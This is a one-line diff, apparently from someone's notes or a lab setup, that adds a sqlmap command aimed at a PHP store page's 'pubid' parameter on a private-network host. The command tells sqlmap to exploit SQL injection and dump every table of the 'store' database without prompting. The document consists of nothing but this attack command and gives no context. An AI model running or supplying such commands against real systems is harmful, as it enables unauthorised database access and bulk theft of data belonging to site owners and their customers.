@@ -1,0 +1,1 @@
+sqlmap -u http://10.0.0.118/store/bookPerPub.php?pubid= --dump-all --batch -D store
